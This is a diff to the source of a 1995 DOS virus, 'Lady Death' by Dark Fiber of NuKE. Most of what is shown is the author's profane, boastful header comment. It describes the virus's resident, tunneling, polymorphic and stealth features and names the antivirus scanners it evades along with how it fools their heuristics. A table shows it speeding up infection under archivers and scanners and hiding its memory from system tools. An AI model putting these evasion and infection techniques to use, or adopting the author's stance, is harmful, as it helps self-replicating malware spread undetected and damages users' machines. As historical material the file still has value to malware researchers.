@@ -1,3 +1,259 @@
+Comment ~
+
+        AAieeee. I'm sick to death of looking at this code any longer!
+
+I could not test this 100%, coz my machine had an incompatibility i think.
+and it only shows up when i infect SOME .exe files.  What happens is that
+the file is infected properly, its header is updated, so is the memory
+requirements, and the stack.  Now, it makes no difference if the virus
+is in memory or not, but MSDos will load all the file into memory, except
+for the last 512bytes or so, so everything gets decrypted, but because
+the heap is at the end, its missing, along with some of the code.....
+This is through no fault of mine, because the code is sound, so.....
+
+---------------------------------[ MISC. SHIT ]--------------------------------
+
+                                      ***
+                             **  DELTA RELEASE  **
+                          **  (C) 1995 DARK FIBER  **
+                                      ***
+
+                                      ***
+        ** I told a few people it would be finished by a certain date **
+             ** Well, NuKE are renowned for their shoddy viruses **
+                 ** So I wanted to do some extra bug testing **
+                   ** Thats my excuse for its late release **
+       ** So I'm hoping to the great binary god its bloody bug free ;) **
+         ** Ugh, Ugh, Ugh, after 4 versions it better bloody well be **
+                                      ***
+
+------------------------------[ MISC. SHIT ENDS ]------------------------------
+
+           Virus Name : Lady Death (a.k.a the Stainless Steel Armadillo)
+
+                        Chotto Abunai ne?
+                        (Translation : "Little bit dangerous hmmm?")
+
+              Version : 0.1 Delta
+
+               Author : Dark Fiber [NuKE]
+
+               Origin : Australia
+
+                Bonus : Comments and ramblings from the author. Free of charge
+                        Yes, completley useless rants thrown in for good
+                        measure.
+
+                 Type : UMB Resident, Tunneling, Poly, Stealth, .COM .EXE .XTP,
+                        MCB stealth (Yeah! finally got it working! ð:)
+
+    Minimum Processor : 80286. Not tested for. Who gives a fuck if some wanky
+                        little XT does down.  They will probably think the
+                        long wait means its still trying to load! heheheh ;)
+
+              Payload : N.A.  Nada, Zip, Zilch,
+
+Retroish thingy stuff : MSAV VSafe
+                        CPAV VSafe
+                        McAfee Scan
+                        F'ing-Protection
+                        Vet
+                        InVercible
+                        ThunderByteAntiVirus
+                        ThunderByteAntiVirus (On Tunneling)
+                        ThunderByteClean (TBClean cant clean the infection)
+                        AntiVirusPro
+                        VDS (Well, it avoided its bait files, etc)
+                            (or is that just my stealth? ;)
+
+       Anti-Heurstics : TBscan : On .COM files it fools TBScan into thinking
+                                 its a .TXT file, so it just "Looks", .EXE
+                                 files have no protection due to IP points
+                                 directly at the polycode
+                        F-Prot : Uses the standard F-Prot kill technique of a
+                                 short jump (PIQ clear).
+                                 Shit, just fot 2.19, and the Anti-FP does
+                                 not work any more. gotta find some new stuff.
+                        AVP : On 2.2 it finds a EXETSR_Type virus or something.
+
+    Poly \ Encryption : Lady Deaths Cosmetic Kit ð;)
+                        Polymorph routines will generate a decryption routine
+                        somewhere in the range of about 30 bytes to 64 bytes,
+                        Will encrypt files with ADD, SUB, XOR, (NOT+NEG rmoved)
+
+                        Lady Death's cosmetic kit,
+                        Yes, it changes the face of your virus, takes those
+                        unencrypted wrinkles out of your life, Lady Death's
+                        cosmetic kit works wonders on memory resident .COM
+                        and .EXE infectors, making them look more complex
+                        than they really are, we here at [NuKE] will garuntee
+                        that your virus will have that "just encrypted" look
+                        that every young encrypted virus has, or we'll give
+                        you your un-encrypted virus back, free of charge.
+
+                        The polymorphic routines generate a variable length
+                        decryptor, so the virus must be padded between the
+                        end of the virus and the copy of the original
+                        un-altered header to create a constant length I can
+                        stealth.
+
+                        After reading the documentation for TBAV [WTF! READ
+                        documentaion! shya ;)] I liked the part where it tells
+                        of creating a scan string for Malaga or something (one
+                        of the encrypted Jerusalem variants) and about how it
+                        only used two different CondJump opcodes, wich helped
+                        give it away. So after some thinking, I managed to
+                        implement 6 different ones, a step up from the standard
+                        two ;), so thats 12 diff loops (up+down) in total!
+
+                        The poly is the lamest routine in here, but I was
+                        despairing over the size of her.... so had to be
+                        cheap and cut back somewhere!
+
+                        I originally had the virus completley polymorphing the
+                        WHOLE file (in chunks), this put a major slowdown,
+                        because, while avoiding memory scanners, it would
+                        decrypt Int21h EVERY SINGLE TIME it was called, now
+                        this is the most overused INT ever, its called more
+                        times than the bloody clock per second, and it also
+                        put an overhead of like 64 bytes of decryption per
+                        chunk, so basically it is not really feasible.
+
+                 Size : Poly (Max 64) + Virus Size + Padding + Header (018h)
+                        2774 bytes infected
+
+     Scan Stuff Finds : Scan 2.x                : Nothing.
+                                                  (Like thats an achievement)
+                        F-Prot 2.19 (/Analyse)  : Nothing
+                        F-Prot 2.19 (/Paranoid) : Nothing
+                        TBAV 6.35               : Flags, flags, flags ;(
+                        AVP 2.2                 : Suspicious
+
+             Compiler : A86 v3.72
+                         People with enough money and no sense who own copies
+                        of TASM or MASM will have to do a re-write, but hey,
+                        thats against the laws of copyright ;).
+                         People with no money and no sense who own pirated
+                        copies of TASM or MASM can just ftp down to there local
+                        site and leech a copy of A86.
+                         People with a lesser version of A86 can just leech a
+                        new version.
+                         People who are using CHASM can just fuck off.
+
+         Side Effects : Hmm, well, i used the 6th bit (starting from 0)
+                        to mark an infection, as far as i could tell, its the
+                        only bit that is not used as Novel use the last bit
+                        (7) for some network execution status thingy.
+                        The FCB stealth routine, well, because non extended
+                        FCB's dont include the attrib field, we can't test for
+                        an infection, but how many programs use standard FCB's?
+                        It does not check to see how small a file is before
+                        infecting it, so it will infect files 0 bytes long.
+
+                Notes : This virus changes its behaviour on the fly
+                        depending on what program or function is being
+                        run as to what mode it will enter.
+                        Programs such as SCAN\PKZip,ARJ, etc will make
+                        the virus go into FastInfection mode which will infect
+                        any file opened with 3D\6C, while programs like
+                        Scandisk, Chkdsk, or NortonDiskDoctor  make the virus
+                        turn all its stealthing modes off, etc, etc.
+                        Minimum memory required by the program is also
+                        adjusted for .EXE files
+
+         Mode Changes : * PKZip, PKZipfix, (PKZ*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * Arj, Arjm, Arjsort, (ARJ*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * LHA, LHArc , (LHA*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * RAR (RAR*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * Microsoft Backup (MSB*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * Central Point Backup (CPB*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * Backup (BAC*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - FastInfection on
+                        * Norton Disk Doctor (NDD*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                        * Chkdsk (CHK*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                          - Hide our MCB memory
+                        * Scandisk (SCAND*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                        * Speedisk (SPEE*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                        * Defrag (DEF*)
+                          - StealthFCB+DTA+Stamp off
+                          - StealthRead off
+                        * Scan (McAfee) (SC*)
+                          - Fast infection on
+                        * Vet Anti-Virus (VET*)
+                          - Fast infection on
+                        * Invercible (IV*)
+                          - Infect files off
+                        * F-Prot (F-*)
+                          - Fast infection on
+                        * AVPro + AVPTsr, etc (AV*)
+                          - Infect files off
+                        * TBav family of programs. (TB*)
+                          - Infect files off
+                        * List.com (Makes a great infection vector) (LI*)
+                          - Fast infection on
+                        * T.com (its what i call list.com) (T.*)
+                          - Fast infection on
+                        * Qemm Manifest (MFT*)
+                          - Hide our MCB memory
+                        * SI ?? (SI*)
+                          - Hide our MCB memory
+                        * MI ?? (MI*)
+                          - Hide our MCB memory
+                        * Sysinfo (Nortons) (SYSI*)
+                          - Hide our MCB memory
+                        * Mem (MessyDos) (MEM*)
+                          - Hide our MCB memory
+
+           Disclaimer : No bytes or stray bits where killed during the making
+                        of this virus, however an MCB header was damaged when
+                        it failed to get out of the way.
+
+  ReVisionary History : 0.1a    - Concieved with the froth of my loins and my
+                                  assembler.
+                                  2327? bytes of code (-Poly, -Header)
+                        0.1b    - Refined the figure of this pale skinned
+                                  beauty (Err, um, I optimised some code)
+                                  No changes were made to her costume (err No
+                                  bug fixes were implemented.)
+                                  And made her black leather outfit a bit
+                                  shinnier ;) (Um, made the polymorph better)
+                                  2358 bytes of code per infection.
+                        0.1c    - Gave her a new hairdo (Um, added MCB stealth)
+                                  2423 bytes of code per infection.
+                        0.1d    - Added tunneling. Fixed the MCB stealth
+                                  bug. blah. blah. Some more minor things.
+                                  2774 bytes of code per infection.
+
+~
+
 ;-------------------------------[ CODERS READY ]-------------------------------
 ;-----------------------[ CODERS, START YOUR ASSEMBLER ]-----------------------
 ;---------------------------------[ ASSEMBLE ]---------------------------------
@@ -1524,6 +1780,20 @@ ModeChangeFiles:
 ModeFilesLen equ $ - ModeChangeFiles
 
 ; -----------------------------------------------------------------------------
+
+comment  %
+
+include [LADYDETH.PLY]
+
+Lady Death's cosmetic kit,
+  Yes, it changes the face of your virus, takes those unencrypted wrinkles
+  out of your life, Lady Death's cosmetic kit works wonders on memory resident
+  .COM and .EXE infectors, making them look more complex than they really are,
+  we here at [NuKE] will garuntee that your virus will have that
+  "just encrypted" look that every young encrypted virus has, or we'll give
+  you your un-encrypted virus back, free of charge.
+
+%
 
 ;Do you think I have watched too many Oli of Olay adds?
 
